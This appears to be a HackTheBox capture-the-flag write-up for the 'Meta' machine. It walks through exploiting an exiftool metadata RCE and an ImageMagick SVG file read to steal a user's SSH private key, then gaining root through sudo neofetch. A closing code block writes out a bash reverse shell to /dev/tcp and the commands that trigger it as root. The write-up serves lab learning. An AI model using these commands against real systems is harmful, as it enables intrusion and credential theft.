---
title: Meta HackTheBox Writeup
tags: [writeup,rest,python,hackthebox,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/1.png)

## Scanning
We run **nmap** on all ports with scripts and software versions. We see that the web service redirects to the domain *artcorp.htb*, we insert it in our */etc/hosts* file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/2.png)


## Enumeration
We tested access at both sites, but they lead to the same destination.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/3.png)

##### Viewing website:
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/4.png)

We list three possible relevant users in the company:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/5.png)

We also see that they are promoting a new product called "*MetaView*" (the machine is called Meta, so it could be a clue).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/6.png)

We launch the **wfuzz** tool and enumerate a subdomain "*dev01.artcorp.htb*":

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/7.png)

We access the website, find a link to the tool they are developing.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/8.png)


## Exploitation
There appears to be a file upload field and it displays metadata. 

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/9.png)

If we look at the result, it is very similar to the output of the **exiftool**:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/10.png)

#### Exploit: [https://github.com/OneSecCyber/JPEG_RCE](https://github.com/OneSecCyber/JPEG_RCE)

We perform the same process of the exploit and insert a system command (*"ls -lna"*) in the image metadata:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/11.png)

We upload the image and see that the command is executed on the machine:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/12.png)

Since we had to put all the code in the metadata, I found it easier to encode the payload in **base64**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/13.png)

We insert the **base64** payload, add decoding and execution on the victim machine:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/14.png)

We listen in with a **netcat** and gain access to the machine:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/15.png)

We tried to read the user flag, but we do not have permissions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/16.png)

We run **pspy** and see that a script called "*convert_images.sh*" is executed:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/17.png)

#### Visualizing content:
The script takes the inserted content of the path "*/var/www/dev01.artcorp.htb/convert_images/*" and executes it with mogrify accepting any file:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/18.png)


So I checked the version and did some research:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/19.png)

So, I used the following file to copy the SSH private key of the user "*thomas*" and inserted it in a m3.svg file in the path "*/var/www/dev01.artcorp.htb/convert_images/*" and we only had to wait for the script to run it in a few minutes.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/20.png)

We wait a few minutes and see that we have obtained the "*id_rsa*" file of the user *Thomas*:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/22.png)

## Privilege Escalation
We connect via **SSH** with the private key and read the user flag.

We also see that we can run as the root user the "**neofetch**" binary.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/23.png)

We searched [gtfobins/neofetch/](https://gtfobins.github.io/gtfobins/neofetch/) and found ways to exploit this binary.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/26.png)

We can see that there is a configuration file for this binary in our folder.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/24.png)

We insert our reverse shell into our neofetch configuration file:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/25.png)

We put a **netcat** listening on port 443 and execute the two commands through the terminal. We will gain root access and read the flag.

### Explotation code:
```bash
# Reverse shell /home/thomas/.config/neofetch/config.php
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.XX.XX/443 0>&1"

# Terminal execution
export XDG_CONFIG_HOME="$HOME/.config"
sudo -u root /usr/bin/neofetch \"\" 
```

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Meta/27.png)




